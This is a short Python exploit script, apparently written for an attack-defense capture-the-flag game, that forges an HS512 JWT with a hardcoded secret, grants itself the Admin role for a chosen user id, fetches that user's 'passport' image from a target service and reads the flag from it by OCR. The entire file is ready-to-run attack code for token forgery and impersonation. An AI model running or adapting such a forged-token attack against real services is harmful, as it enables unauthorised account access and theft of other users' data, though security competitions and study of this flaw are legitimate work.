#!/usr/bin/env python3

import sys

import requests
import jwt
import pytesseract
import base64
from datetime import datetime
from os import remove
from PIL import Image

JWT_SECRET = "53cr3t_k3y"


def exploit(ip, port, flag_id):
    baseurl=f"http://{ip}:{port}"

    dt = datetime(2023, 1, 1, 00, 00, 00)
    encoded_jwt = jwt.encode({
        "user": {
            "userId": int(flag_id), 
            "username": "", 
            "displayname": "",
            "role": "Admin" 
        },
        "exp": int(dt.timestamp())
    }, key=JWT_SECRET, algorithm="HS512")
    if type(encoded_jwt) is not str:
        encoded_jwt = encoded_jwt.decode("utf-8")
    print(encoded_jwt)

    response = requests.get(f'{baseurl}/auth/passport', headers={'Authorization': f"Bearer {encoded_jwt}"})
    print(response.text)
    
    if response.status_code != 200:
        print(response.status_code)
        print(response.text)
        print("Error when getting passport")
        print(response.text)
        exit(-1)
    
    passport_png_base64 = response.text
    print(passport_png_base64)
    passport_png = base64.b64decode(passport_png_base64)
    f = open("image.png", "wb+")
    f.write(passport_png)
    f.close()

    
    im = Image.open("image.png")
    print(im.info)

    print("Found the flag:", pytesseract.image_to_string("image.png").replace(" ",""))
    remove("image.png")


if __name__ == '__main__':
	if len(sys.argv) != 4:
		sys.stderr.write('Usage: ./exploit_jwt.py IP PORT FLAG_ID\n')
		sys.exit(1)
	exploit(sys.argv[1], sys.argv[2], sys.argv[3])
